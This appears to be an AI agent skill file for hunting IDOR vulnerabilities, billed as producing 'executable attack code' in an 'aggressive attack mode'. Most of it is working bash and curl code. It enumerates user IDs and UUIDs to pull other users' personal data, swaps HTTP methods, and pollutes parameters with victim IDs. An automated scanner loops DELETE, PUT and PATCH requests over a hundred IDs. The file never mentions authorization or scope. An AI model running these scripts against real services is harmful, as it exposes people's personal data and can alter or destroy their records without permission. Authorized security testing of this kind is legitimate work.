---
name: hunt-idor
description: IDOR hunting — Horizontal and vertical privilege escalation. Generates ready-to-run enumeration scripts, two-session diff techniques, and escalation paths. This skill produces executable attack code for finding and exploiting IDOR vulnerabilities.
---

# IDOR HUNTING — AGGRESSIVE ATTACK MODE

**IDOR is the #1 most paid web2 bug class — 30% of all submissions that get paid.**

## Quick Start

```bash
# Test for IDOR on a numeric ID endpoint
TARGET="https://example.com/api/users"
TOKEN_ATTACKER="attacker-session-token"

for id in $(seq 1 100); do
  response=$(curl -s -H "Authorization: Bearer $TOKEN_ATTACKER" "$TARGET/$id")
  if echo "$response" | grep -q "email\|name\|phone\|address"; then
    echo "[+] IDOR CONFIRMED: User $id data accessible"
    echo "$response" | python3 -m json.tool
  fi
done
```

## Two-Session Diff Method

The gold standard for IDOR testing:

```bash
# Session A (attacker) — low-priv user
TOKEN_A="attacker-token"

# Session B (victim) — different user with data
TOKEN_B="victim-token"

# Step 1: Get attacker's own data
echo "=== Attacker's own data ==="
curl -s -H "Authorization: Bearer $TOKEN_A" "https://example.com/api/users/me"

# Step 2: Try to access victim's data with attacker's token
echo "=== Victim's data with attacker's token ==="
curl -s -H "Authorization: Bearer $TOKEN_A" "https://example.com/api/users/$VICTIM_ID"

# Step 3: Compare responses
# If attacker can read victim's data → IDOR CONFIRMED
```

## Enumeration Techniques

### Numeric ID Enumeration
```bash
# Sequential enumeration
for id in $(seq 1 1000); do
  curl -s -H "Authorization: Bearer $TOKEN" "$TARGET/api/users/$id" -o /dev/null -w "%{http_code} $id\n"
done | grep "200"
```

### UUID Enumeration
```bash
# Find UUIDs from other endpoints
curl -s -H "Authorization: Bearer $TOKEN" "$TARGET/api/users" | grep -oE "[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}"

# Test each UUID
for uuid in $(cat uuids.txt); do
  curl -s -H "Authorization: Bearer $TOKEN" "$TARGET/api/users/$uuid" -o /dev/null -w "%{http_code} $uuid\n"
done | grep "200"
```

### HTTP Method Swap
```bash
# Test all methods on same endpoint
METHODS=("GET" "POST" "PUT" "DELETE" "PATCH" "OPTIONS" "HEAD")
for method in "${METHODS[@]}"; do
  curl -s -X $method -H "Authorization: Bearer $TOKEN" "$TARGET/api/users/$VICTIM_ID" -o /dev/null -w "%{http_code} $method\n"
done
```

### Old API Version
```bash
# Test v1 vs v2
curl -s -H "Authorization: Bearer $TOKEN" "$TARGET/api/v1/users/$VICTIM_ID"
curl -s -H "Authorization: Bearer $TOKEN" "$TARGET/api/v2/users/$VICTIM_ID"
```

### Parameter Pollution
```bash
# Add user_id parameter
curl -s -H "Authorization: Bearer $TOKEN" "$TARGET/api/orders?user_id=$VICTIM_ID"

# Add to JSON body
curl -s -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d "{\"user_id\":\"$VICTIM_ID\"}" "$TARGET/api/orders"
```

### GraphQL IDOR
```bash
# GraphQL node() query
curl -s -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"query":"{ node(id: \"base64(User:'$VICTIM_ID')\") { email name } }"}' \
  "$TARGET/graphql"
```

## Automated IDOR Scanner

```bash
#!/bin/bash
TARGET=$1
ENDPOINT=$2
TOKEN=$3

echo "=== IDOR SCAN: $ENDPOINT ==="

# Test numeric IDs
for id in $(seq 1 100); do
  for method in GET POST PUT DELETE PATCH; do
    response=$(curl -s -o /dev/null -w "%{http_code}" -X $method \
      -H "Authorization: Bearer $TOKEN" \
      -H "Content-Type: application/json" \
      "$TARGET$ENDPOINT/$id")
    
    if [ "$response" == "200" ]; then
      echo "[+] $method $ENDPOINT/$id → $response (POSSIBLE IDOR)"
      curl -s -X $method -H "Authorization: Bearer $TOKEN" "$TARGET$ENDPOINT/$id" | head -20
    fi
  done
done

# Test UUIDs
for uuid in $(cat uuids.txt 2>/dev/null); do
  response=$(curl -s -o /dev/null -w "%{http_code}" \
    -H "Authorization: Bearer $TOKEN" \
    "$TARGET$ENDPOINT/$uuid")
  
  if [ "$response" == "200" ]; then
    echo "[+] GET $ENDPOINT/$uuid → $response (POSSIBLE IDOR)"
  fi
done
```

## Escalation Paths

| IDOR Type | Impact | Severity |
|-----------|--------|----------|
| Read other user's PII | Data breach | Medium-High |
| Read admin data | Privilege escalation | High |
| Modify other user's data | Data manipulation | High |
| Delete other user's data | Data destruction | High |
| Read financial data | Financial impact | Critical |
| Modify financial data | Fraud | Critical |
| Admin endpoint access | System compromise | Critical |

## Checklist

- [ ] Two accounts ready (attacker + victim)
- [ ] All HTTP methods tested (GET, POST, PUT, DELETE, PATCH)
- [ ] Old API versions tested (/v1/, /v2/)
- [ ] UUID enumeration completed
- [ ] GraphQL node() queries tested
- [ ] Parameter pollution tested
- [ ] Response comparison completed
- [ ] Impact quantified ("affects N users")
